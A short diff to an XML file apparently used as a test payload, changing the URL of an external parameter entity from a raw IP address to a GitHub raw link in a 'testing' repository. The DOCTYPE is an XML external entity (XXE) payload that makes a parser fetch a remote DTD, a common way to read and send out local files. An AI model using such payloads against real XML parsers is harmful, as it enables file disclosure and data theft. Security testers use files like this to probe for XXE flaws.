@@ -1,6 +1,6 @@
 <?xml version="1.0" ?>
 <!DOCTYPE message [
-    <!ENTITY % ext SYSTEM "http://137.184.35.253/ext.dtd">
+    <!ENTITY % ext SYSTEM "https://raw.githubusercontent.com/jkana/testing/main/ext.dtd">
     %ext;
 ]>
 <message></message>
